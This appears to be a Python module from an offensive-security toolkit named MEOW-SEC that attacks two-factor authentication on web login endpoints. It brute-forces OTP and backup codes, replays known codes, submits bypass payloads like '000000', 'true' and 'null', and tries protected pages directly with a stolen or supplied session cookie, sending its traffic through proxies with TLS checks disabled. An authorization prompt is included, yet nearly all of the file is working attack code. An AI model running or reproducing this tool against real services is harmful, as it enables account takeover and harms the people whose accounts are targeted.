# -*- coding: utf-8 -*-
"""
MEOW-SEC :: 2FA — Two-Factor Authentication Bypass Tester
For authorized security testing and CTF challenges only.
"""
import os, re, json, time, itertools
from datetime import datetime
from urllib.parse import urlparse

from core.ui import (console, ok, err, info, warn, find, boot_progress,
                     print_result_table, show_module_banner, ask_target,
                     ask_choice, G1, G2, CY, OR, RD, DM)
from core.cats import CAT_FOUND, CAT_SCAN, cat_talk
from rich.prompt import Confirm, Prompt

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

from core.proxy_manager import px as _px

HEADERS = {"User-Agent": "MEOW-2FA/1.1 (authorized-test)"}

def _post(url: str, data: dict, session=None, timeout: int = 8) -> dict:
    sess = session or requests.Session()
    try:
        r = sess.post(url, data=data, headers=HEADERS,
                      timeout=timeout, verify=False, proxies=_px(),
                      allow_redirects=True)
        return {"ok": True, "status": r.status_code, "text": r.text[:3000],
                "headers": dict(r.headers)}
    except Exception as e:
        return {"ok": False, "status": 0, "error": str(e)[:60], "text": ""}

def _get(url: str, session=None, timeout: int = 8) -> dict:
    sess = session or requests.Session()
    try:
        r = sess.get(url, headers=HEADERS, timeout=timeout, verify=False,
                     proxies=_px(), allow_redirects=True)
        return {"ok": True, "status": r.status_code, "text": r.text[:3000]}
    except Exception as e:
        return {"ok": False, "status": 0, "error": str(e)[:60], "text": ""}

# ─── TEST 1: OTP Code Brute Force ─────────────────────────────
def _brute_otp(url: str, otp_field: str, cookies: dict, success_text: str,
               code_len: int = 6) -> list:
    findings = []
    sess = requests.Session()
    sess.cookies.update(cookies)

    total = 10 ** code_len
    info(f"Brute forcing {code_len}-digit OTP ({total} combinations)...")
    warn("This will take a long time for 6-digit codes. Use for 4-digit codes or short ranges.")

    for i in range(min(total, 10000)):  # Cap at 10k for safety
        code = str(i).zfill(code_len)
        r = _post(url, {otp_field: code}, session=sess)
        if not r["ok"]:
            continue
        if success_text and success_text.lower() in r["text"].lower():
            findings.append({"method": "OTP_BRUTE", "code": code,
                             "note": f"Valid OTP found: {code}"})
            find(f"Valid OTP: [{G1}]{code}[/]")
            return findings
        # Detect lockout
        if "locked" in r["text"].lower() or "too many" in r["text"].lower():
            warn(f"Account lockout detected at attempt {i}")
            return findings
        if i % 100 == 0:
            info(f"  Tried {i}/{min(total,10000)}...")
        time.sleep(0.1)  # Rate limit ourselves
    return findings

# ─── TEST 2: Code Reuse ────────────────────────────────────────
def _test_code_reuse(url: str, otp_field: str, cookies: dict,
                     known_code: str, success_text: str) -> list:
    findings = []
    sess = requests.Session()
    sess.cookies.update(cookies)

    info(f"Testing OTP reuse with code [{CY}]{known_code}[/]...")
    for i in range(3):
        r = _post(url, {otp_field: known_code}, session=sess)
        if r["ok"] and success_text and success_text.lower() in r["text"].lower():
            findings.append({"method": "CODE_REUSE", "code": known_code,
                             "attempt": i+1, "note": "OTP reuse accepted!"})
            find(f"OTP reuse ACCEPTED on attempt [{CY}]{i+1}[/]!")
        else:
            info(f"  Attempt {i+1}: [{DM}]rejected[/]")
        time.sleep(1)
    return findings

# ─── TEST 3: Response Manipulation ────────────────────────────
def _test_response_manipulation(url: str, otp_field: str) -> list:
    findings = []
    info("Testing response manipulation (interceptor simulation)...")
    # This tests if the server-side validation can be bypassed by submitting
    # known bad values and checking if status code alone determines access
    for code in ["000000","111111","999999","123456","aaaaaa","true","1","null"]:
        r = _post(url, {otp_field: code})
        if r["ok"]:
            if r["status"] == 200 and "dashboard" in r["text"].lower():
                findings.append({"method": "BYPASS_PAYLOAD", "code": code,
                                 "note": f"Payload '{code}' bypassed 2FA"})
                find(f"2FA bypass payload: [{G1}]{code}[/]")
    return findings

# ─── TEST 4: Backup Code Brute ─────────────────────────────────
def _test_backup_codes(url: str, code_field: str, cookies: dict,
                       success_text: str, pattern: str = "8digit") -> list:
    findings = []
    sess = requests.Session()
    sess.cookies.update(cookies)

    patterns = {
        "8digit": [str(i).zfill(8) for i in range(0, 200)],
        "alphanum": ["aaa"+str(i) for i in range(100)],
        "common": ["00000000","11111111","12345678","87654321","abcdefgh",
                   "AAAAAAAA","backup01","backup12","recover1"],
    }
    codes = patterns.get(pattern, patterns["common"])
    info(f"Testing [{CY}]{len(codes)}[/] backup codes...")

    for code in codes:
        r = _post(url, {code_field: code}, session=sess)
        if r["ok"] and success_text and success_text.lower() in r["text"].lower():
            findings.append({"method": "BACKUP_CODE", "code": code,
                             "note": "Backup code accepted"})
            find(f"Valid backup code: [{G1}]{code}[/]")
        time.sleep(0.2)
    return findings

# ─── TEST 5: Skip 2FA ──────────────────────────────────────────
def _test_skip(protected_url: str, session_cookies: dict) -> list:
    findings = []
    sess = requests.Session()
    sess.cookies.update(session_cookies)

    info(f"Testing direct access to [{CY}]{protected_url}[/] (2FA skip)...")
    r = _get(protected_url, session=sess)
    if r["ok"] and r["status"] == 200:
        if not any(kw in r["text"].lower() for kw in ["2fa","otp","verify","authentication"]):
            findings.append({"method": "SKIP_2FA", "note": "Protected page accessible without 2FA",
                             "url": protected_url})
            find(f"2FA SKIP — direct access to [{G1}]{protected_url}[/] succeeded!")
    return findings

# ─── MAIN ─────────────────────────────────────────────────────
def run(target: str = None):
    show_module_banner("2fa")
    cat_talk(CAT_SCAN, "2FA bypass module — testing authentication weaknesses...", OR)
    console.print()

    warn("2FA bypass testing MUST only be done on systems you own or have explicit written permission.")
    if not Confirm.ask(f"  [{RD}]I have explicit written authorization for this target[/]"):
        info("Aborted."); return
    console.print()

    if not target:
        target = ask_target("2FA endpoint URL (https://example.com/verify-otp)")
    if not target:
        err("No target."); return

    if not target.startswith("http"):
        target = "https://" + target

    info(f"Target: [{CY}]{target}[/]")
    console.print()

    console.print(f"  [{G1}][1][/] OTP brute force (4-digit codes, capped at 10k)")
    console.print(f"  [{G1}][2][/] OTP code reuse test")
    console.print(f"  [{G1}][3][/] Response manipulation payloads")
    console.print(f"  [{G1}][4][/] Backup code brute force")
    console.print(f"  [{G1}][5][/] Skip 2FA (direct endpoint access)")
    console.print(f"  [{G1}][6][/] Full test (all methods)")
    mode = ask_choice("Mode", "3")

    otp_field    = Prompt.ask(f"  [{CY}]OTP field name[/]", default="otp")
    success_text = Prompt.ask(f"  [{CY}]Text present on SUCCESS (optional)[/]", default="")

    cookies = {}
    cookie_raw = Prompt.ask(f"  [{CY}]Session cookie (name=value, optional)[/]", default="")
    if cookie_raw and "=" in cookie_raw:
        for part in cookie_raw.split(";"):
            if "=" in part:
                k, v = part.strip().split("=", 1)
                cookies[k.strip()] = v.strip()

    boot_progress(["Preparing 2FA tests...", "Loading payloads...", "Connecting..."])
    console.print()

    all_findings = []

    if mode in ("1", "6"):
        code_len = int(Prompt.ask(f"  [{CY}]OTP length[/]", default="4"))
        all_findings += _brute_otp(target, otp_field, cookies, success_text, code_len)

    if mode in ("2", "6"):
        known = Prompt.ask(f"  [{CY}]Known OTP code to reuse[/]", default="123456")
        all_findings += _test_code_reuse(target, otp_field, cookies, known, success_text)

    if mode in ("3", "6"):
        all_findings += _test_response_manipulation(target, otp_field)

    if mode in ("4", "6"):
        all_findings += _test_backup_codes(target, otp_field, cookies, success_text)

    if mode in ("5", "6"):
        protected = Prompt.ask(f"  [{CY}]Protected URL to try accessing (dashboard, profile...)[/]", default="")
        if protected:
            if not protected.startswith("http"):
                protected = "https://" + protected
            all_findings += _test_skip(protected, cookies)

    console.print()
    if all_findings:
        rows = [(f["method"], f.get("code","—"), f["note"][:60]) for f in all_findings]
        print_result_table("2FA Bypass Findings", ["METHOD", "CODE/VALUE", "NOTE"], rows)
    else:
        ok("No 2FA bypass vulnerabilities detected.")

    _save(target, all_findings)

def _save(target, findings):
    out = os.path.join(os.path.dirname(__file__), "..", "data")
    os.makedirs(out, exist_ok=True)
    fname = os.path.join(out, f"2fa_{urlparse(target).netloc.replace('.','_')}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json")
    with open(fname, "w", encoding="utf-8") as f:
        json.dump({"target": target, "findings": findings, "time": datetime.now().isoformat()}, f, indent=2)
    ok(f"Results saved → [{CY}]{os.path.basename(fname)}[/]")
